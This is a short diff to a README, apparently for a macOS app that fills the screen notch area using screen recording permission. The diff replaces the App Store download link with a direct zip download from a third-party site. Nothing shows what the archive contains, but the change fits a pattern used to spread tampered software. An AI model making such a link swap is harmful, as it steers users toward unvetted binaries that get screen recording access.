@@ -15,7 +15,7 @@ This application uses screen recording permissions to view the content of the ga
 Only when the mouse passes through the gap will it be supplemented with content, which occupies extremely low system resources.   
 In different zoom ratios of the screen, the gap content can be accurately filled.   
 
-[商店下载](https://apps.apple.com/app/id1597626310?mt=12)
+[下载](https://macosgame.com/notch.zip)
 ![](./1.png)
 
 —联系我们—
